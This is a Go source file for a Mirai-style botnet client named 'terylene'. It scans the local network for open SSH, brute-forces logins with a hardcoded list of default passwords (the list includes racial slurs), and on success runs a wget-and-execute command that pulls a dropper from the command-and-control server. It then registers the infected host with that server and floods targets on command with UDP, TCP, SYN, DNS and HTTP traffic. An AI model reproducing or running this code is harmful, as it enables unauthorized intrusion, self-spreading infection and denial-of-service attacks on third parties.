package main

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
	skills "terylene/mirai/components/skills"
	system "terylene/mirai/components/system"
	attack "terylene/mirai/ddos"

	zmq "github.com/pebbe/zmq4"
	"golang.org/x/crypto/ssh"
)

const (
	//config here
	C2ip          = "127.0.0.1"
	broadcastport = "5555"
	routerport    = "5556"

	//command to download the dropper from the C2 and execute
	//dont change unless you know what you're doing
	infcommand = "wget -O file http://%s:8080/terylene && export DEBIAN_FRONTEND=noninteractive || true && apt-get install -y libzmq3-dev || true && yes | sudo pacman -S zeromq || true && sudo dnf -y install zeromq || true && chmod +x file && ./file"
)

var (
	// config here
	//brute force <user> : list of passwords
	passwordMap = map[string][]string{
		"root": {
			"", "root", "toor", "nigger", "nigga", "raspberry", "dietpi", "test", "uploader", "password", "Admin", "admin", "administrator", "marketing", "12345678", "1234", "12345", "qwerty", "webadmin", "webmaster", "maintenance", "techsupport", "letmein", "logon", "Passw@rd", "alpine", "111111", "1234", "12345", "123456", "1234567", "12345678", "abc123", "dragon", "iloveyou", "letmein", "monkey", "password", "qwerty", "tequiero", "test", "5201314", "bigbasket",
		},
		"admin": {
			"", "root", "toor", "nigger", "nigga", "raspberry", "dietpi", "test", "uploader", "password", "Admin", "admin", "administrator", "marketing", "12345678", "1234", "12345", "qwerty", "webadmin", "webmaster", "maintenance", "techsupport", "letmein", "logon", "Passw@rd", "alpine", "111111", "1234", "12345", "123456", "1234567", "12345678", "abc123", "dragon", "iloveyou", "letmein", "monkey", "password", "qwerty", "tequiero", "test", "5201314", "bigbasket",
		},
		"Admin": {
			"", "root", "toor", "nigger", "nigga", "raspberry", "dietpi", "test", "uploader", "password", "Admin", "admin", "administrator", "marketing", "12345678", "1234", "12345", "qwerty", "webadmin", "webmaster", "maintenance", "techsupport", "letmein", "logon", "Passw@rd", "alpine", "111111", "1234", "12345", "123456", "1234567", "12345678", "abc123", "dragon", "iloveyou", "letmein", "monkey", "password", "qwerty", "tequiero", "test", "5201314", "bigbasket",
		},
		"ubnt": {"ubnt"},
		"kali": {"kali"},
	}

	//WARNING: these are builtin methods, dont change them
	methods = []string{"UDP", "TCP", "SYN", "DNS", "HTTP", "UDP-VIP"}
)

func sshattack(ip string, login map[string][]string, wg *sync.WaitGroup) {
	defer wg.Done()
	var wg2 sync.WaitGroup
	cancel := make(chan struct{})

term:
	for user, pass := range login {
		for _, i := range pass {
			select {
			case <-cancel:
				break term
			default:
				wg2.Add(1)
				go sshconnect(ip, user, i, &wg2, cancel)
				time.Sleep(1 * time.Second)
			}
		}
	}

	wg2.Wait()
	close(cancel)
}

func sshconnect(ip, user, pass string, wg *sync.WaitGroup, cancel chan struct{}) {
	defer wg.Done()
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout:         300 * time.Millisecond,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:22", ip), config)
	if err != nil {
		return
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return
	}
	defer session.Close()

	session.Stdout = os.Stdout
	session.Stderr = os.Stderr

	if err := session.Run(fmt.Sprintf(infcommand, C2ip)); err != nil {
		return
	}

	cancel <- struct{}{}
}
func sshworm(ips []string, login map[string][]string) {
	var wg sync.WaitGroup

	if len(ips) == 0 {
		return
	}

	for _, ip := range ips {
		wg.Add(1)
		go sshattack(ip, login, &wg)
	}

	wg.Wait()
}

func migration(dealer, subscriber *zmq.Socket, C2ip, rport string) {
	dealer.Close()
	subscriber.Close()
	nsubscriber, _ := zmq.NewSocket(zmq.SUB)
	nsubscriber.SetLinger(0)
	ndealer, _ := zmq.NewSocket(zmq.DEALER)
	ndealer.SetLinger(0)
	register(ndealer, nsubscriber, C2ip, rport)
}

func dealerhandle(dealer, subscriber *zmq.Socket) {
	for {
		res, err := dealer.RecvMessage(0)
		if err != nil {
			continue
		}

		if res[0] == "heartbeat" {
			dealer.SendMessage("heartbeat")
		}

		if len(res) == 3 {
			if res[0] == "migrate" {
				migration(dealer, subscriber, res[1], res[2])
			}
		}
	}
}

func register(dealer, subscriber *zmq.Socket, C2ip, rport string) error {
	err := dealer.Connect(fmt.Sprintf("tcp://%s:%s", C2ip, rport))

	if err != nil {
		return err
	}
	ip, err := system.GETIPDNS()
	if err != nil {
		return err
	}
	arch, OS := system.GETSYSTEM()

	_, err = dealer.SendMessage("reg", arch, OS, ip)
	if err != nil {
		return err
	}

	res, err := dealer.RecvMessage(0)
	if err != nil {
		return err
	}
	if res[0] == "terylene" {
		go dealerhandle(dealer, subscriber)
		terylene(subscriber, C2ip, res[0], res[1])
	}
	return nil
}

func terylene(subscriber *zmq.Socket, C2ip, bot, bport string) {
	defer subscriber.Close()
	subscriber.Connect(fmt.Sprintf("tcp://%s:%s", C2ip, bport))
	subscriber.SetSubscribe(bot)
	for {
		message, _ := subscriber.Recv(0)

		parts := strings.Split(message, ":")
		message = parts[1]
		if strings.Contains(message, "!") {
			for _, value := range methods {
				if strings.Contains(message, value) {
					parts := strings.Fields(message)
					if len(parts) == 4 {
						method := strings.TrimPrefix(parts[0], "!")
						target := parts[1]
						port, err := strconv.Atoi(parts[2])
						if err != nil {
							continue
						}
						duration, err := strconv.Atoi(parts[3])
						if err != nil {
							continue
						}
						switch method {
						case "UDP":
							for i := 1; i < 5; i++ {
								go attack.UDP(target, port, duration)
							}
						case "TCP":
							for i := 1; i < 5; i++ {
								go attack.TCP(target, port, duration)
							}
						case "HTTP":
							for i := 1; i < 5; i++ {
								go attack.HTTP(target, duration)
							}
						case "DNS":
							for i := 1; i < 5; i++ {
								go attack.DNS(target, duration)
							}
						case "SYN":
							for i := 1; i < 5; i++ {
								go attack.SYN(target, port, duration)
							}
						case "UDP-VIP":
							for i := 1; i < 5; i++ {
								go attack.UDP_VIP(target, port, duration)
							}
						}
					}
				}
			}
		}
	}
}
func startworm() {
	ip, err := system.GETIPDNS()
	OS, _ := system.GETSYSTEM()

	var valid []string
	if err != nil {
		ip := system.GetIpInterface()
		if len(ip) == 0 {
			return
		}
		active := skills.Pinger(ip, OS)
		for _, ip := range active {
			if skills.IsSSHOpen(ip) {
				valid = append(valid, ip)
			}
		}
		sshworm(valid, passwordMap)
	}
	active := skills.Pinger(ip, OS)
	for _, ip := range active {
		if skills.IsSSHOpen(ip) {
			valid = append(valid, ip)
		}
	}
	sshworm(active, passwordMap)
}

func main() {
	go startworm()
	subscriber, _ := zmq.NewSocket(zmq.SUB)
	subscriber.SetLinger(0)
	dealer, _ := zmq.NewSocket(zmq.DEALER)
	dealer.SetLinger(0)
	register(dealer, subscriber, C2ip, routerport)
}
